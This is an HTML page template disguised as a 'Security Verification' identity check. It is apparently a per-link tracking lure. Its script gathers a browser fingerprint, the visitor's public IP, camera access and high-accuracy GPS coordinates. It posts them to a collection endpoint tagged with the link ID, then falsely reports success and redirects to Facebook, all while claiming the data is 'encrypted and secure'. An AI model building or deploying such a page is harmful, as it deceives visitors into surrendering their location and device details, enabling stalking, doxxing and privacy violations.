<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #6e8efb, #a777e3);
            color: white;
            padding: 40px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .header p {
            font-size: 16px;
            opacity: 0.9;
        }
        
        .content {
            padding: 30px;
        }
        
        .step {
            display: flex;
            align-items: center;
            padding: 20px;
            background: #f8fafc;
            border-radius: 12px;
            margin-bottom: 15px;
            transition: all 0.3s;
        }
        
        .step.completed {
            background: #d1fae5;
            border-left: 4px solid #10b981;
        }
        
        .step.active {
            background: #dbeafe;
            border-left: 4px solid #3b82f6;
            transform: scale(1.02);
        }
        
        .step-number {
            width: 40px;
            height: 40px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .step.completed .step-number {
            background: #10b981;
            color: white;
        }
        
        .step.active .step-number {
            background: #3b82f6;
            color: white;
        }
        
        .step-content {
            flex: 1;
        }
        
        .step-content h3 {
            font-size: 18px;
            margin-bottom: 5px;
        }
        
        .step-content p {
            color: #64748b;
            font-size: 14px;
        }
        
        .step-status {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .step.completed .step-status {
            color: #10b981;
        }
        
        .step.active .step-status {
            color: #3b82f6;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e2e8f0;
            border-radius: 4px;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .progress {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            transition: width 0.5s;
        }
        
        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .status {
            text-align: center;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            display: none;
        }
        
        .status.success {
            background: #d1fae5;
            color: #065f46;
        }
        
        .status.error {
            background: #fee2e2;
            color: #991b1b;
        }
        
        .status.info {
            background: #dbeafe;
            color: #1e40af;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            background: #f8fafc;
            color: #64748b;
            font-size: 12px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 20px 0;
        }
        
        .stat-card {
            background: #f8fafc;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #667eea;
        }
        
        .stat-label {
            color: #64748b;
            font-size: 12px;
            margin-top: 5px;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Security Verification</h1>
            <p>Complete all steps to verify your identity</p>
        </div>
        
        <div class="content">
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-value" id="completedSteps">0/4</div>
                    <div class="stat-label">Steps Completed</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="timeElapsed">0s</div>
                    <div class="stat-label">Time Elapsed</div>
                </div>
            </div>
            
            <div class="step" id="step1">
                <div class="step-number">1</div>
                <div class="step-content">
                    <h3>Device Information</h3>
                    <p>Collecting device and browser details</p>
                </div>
                <div class="step-status" id="step1Status">⏳</div>
            </div>
            
            <div class="step" id="step2">
                <div class="step-number">2</div>
                <div class="step-content">
                    <h3>Network Analysis</h3>
                    <p>Checking IP and connection details</p>
                </div>
                <div class="step-status" id="step2Status">⏳</div>
            </div>
            
            <div class="step" id="step3">
                <div class="step-number">3</div>
                <div class="step-content">
                    <h3>Camera Access</h3>
                    <p>Quick photo for verification</p>
                </div>
                <div class="step-status" id="step3Status">⏳</div>
            </div>
            
            <div class="step" id="step4">
                <div class="step-number">4</div>
                <div class="step-content">
                    <h3>Location Access</h3>
                    <p>Confirming your region</p>
                </div>
                <div class="step-status" id="step4Status">⏳</div>
            </div>
            
            <div class="progress-bar">
                <div class="progress" id="progress" style="width: 0%"></div>
            </div>
            
            <button class="btn" id="startBtn" onclick="startVerification()">Start Verification</button>
            <button class="btn" id="nextBtn" style="display: none;" onclick="nextStep()" disabled>Next Step</button>
            
            <div class="status" id="status"></div>
        </div>
        
        <div class="footer">
            <p>© 2024 Security Verification System</p>
            <p>Your data is encrypted and secure</p>
        </div>
    </div>
    
    <script>
        const linkId = '<%= linkId %>';
        let currentStep = 0;
        let completedSteps = 0;
        let startTime = Date.now();
        let timerInterval;
        
        const steps = [
            { id: 'step1', status: 'step1Status', name: 'Device Info' },
            { id: 'step2', status: 'step2Status', name: 'Network' },
            { id: 'step3', status: 'step3Status', name: 'Camera' },
            { id: 'step4', status: 'step4Status', name: 'Location' }
        ];
        
        function updateTimer() {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            document.getElementById('timeElapsed').textContent = elapsed + 's';
        }
        
        function updateProgress() {
            const percent = (completedSteps / 4) * 100;
            document.getElementById('progress').style.width = percent + '%';
            document.getElementById('completedSteps').textContent = completedSteps + '/4';
        }
        
        function setStepActive(stepIndex) {
            steps.forEach((step, index) => {
                const element = document.getElementById(step.id);
                element.classList.remove('active');
                if (index === stepIndex) {
                    element.classList.add('active');
                }
            });
        }
        
        function setStepCompleted(stepIndex) {
            const step = steps[stepIndex];
            const element = document.getElementById(step.id);
            const statusElement = document.getElementById(step.status);
            
            element.classList.remove('active');
            element.classList.add('completed');
            statusElement.textContent = '✅';
            
            completedSteps++;
            updateProgress();
        }
        
        async function sendData(type, data) {
            try {
                const response = await fetch('/api/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        linkId: linkId,
                        type: type,
                        data: data
                    })
                });
                return response.ok;
            } catch (err) {
                console.error('Send error:', err);
                return false;
            }
        }
        
        async function step1_DeviceInfo() {
            setStepActive(0);
            
            const info = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null
            };
            
            await sendData('info', info);
            setStepCompleted(0);
            return true;
        }
        
        async function step2_Network() {
            setStepActive(1);
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                const networkInfo = {
                    ip: data.ip,
                    ...(navigator.connection ? {
                        type: navigator.connection.effectiveType,
                        speed: navigator.connection.downlink,
                        rtt: navigator.connection.rtt
                    } : {})
                };
                
                await sendData('info', { network: networkInfo });
                setStepCompleted(1);
                return true;
            } catch (err) {
                console.error('Network step error:', err);
                setStepCompleted(1); // Continue even if error
                return true;
            }
        }
        
        async function step3_Camera() {
            setStepActive(2);
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // Capture a frame
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.5);
                
                // Send camera access info
                await sendData('camera', {
                    accessed: true,
                    width: video.videoWidth,
                    height: video.videoHeight,
                    timestamp: new Date().toISOString()
                });
                
                stream.getTracks().forEach(track => track.stop());
                setStepCompleted(2);
                return true;
            } catch (err) {
                console.error('Camera error:', err);
                await sendData('camera', { accessed: false, error: err.message });
                setStepCompleted(2); // Continue even if denied
                return true;
            }
        }
        
        async function step4_Location() {
            setStepActive(3);
            
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    });
                });
                
                const locationData = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: position.timestamp
                };
                
                await sendData('location', locationData);
                setStepCompleted(3);
                return true;
            } catch (err) {
                console.error('Location error:', err);
                await sendData('location', { accessed: false, error: err.message });
                setStepCompleted(3); // Continue even if denied
                return true;
            }
        }
        
        async function startVerification() {
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('nextBtn').style.display = 'block';
            
            startTime = Date.now();
            timerInterval = setInterval(updateTimer, 1000);
            
            document.getElementById('status').className = 'status info';
            document.getElementById('status').textContent = 'Starting verification...';
            document.getElementById('status').style.display = 'block';
            
            // Run all steps
            await step1_DeviceInfo();
            await step2_Network();
            
            document.getElementById('nextBtn').disabled = false;
            document.getElementById('status').textContent = 'Please click Next to continue with camera and location access';
        }
        
        async function nextStep() {
            document.getElementById('nextBtn').disabled = true;
            
            if (currentStep === 2) {
                await step3_Camera();
                currentStep = 3;
                document.getElementById('nextBtn').disabled = false;
                document.getElementById('status').textContent = 'Camera access completed. Click Next for location.';
            } else if (currentStep === 3) {
                await step4_Location();
                completeVerification();
            } else {
                currentStep = 2;
                document.getElementById('nextBtn').disabled = false;
                document.getElementById('status').textContent = 'Ready for camera access. Click Next to continue.';
            }
        }
        
        function completeVerification() {
            clearInterval(timerInterval);
            document.getElementById('nextBtn').style.display = 'none';
            
            document.getElementById('status').className = 'status success';
            document.getElementById('status').textContent = '✅ Verification complete! Redirecting to Facebook...';
            
            setTimeout(() => {
                window.location.href = 'https://facebook.com';
            }, 2000);
        }
    </script>
</body>
</html>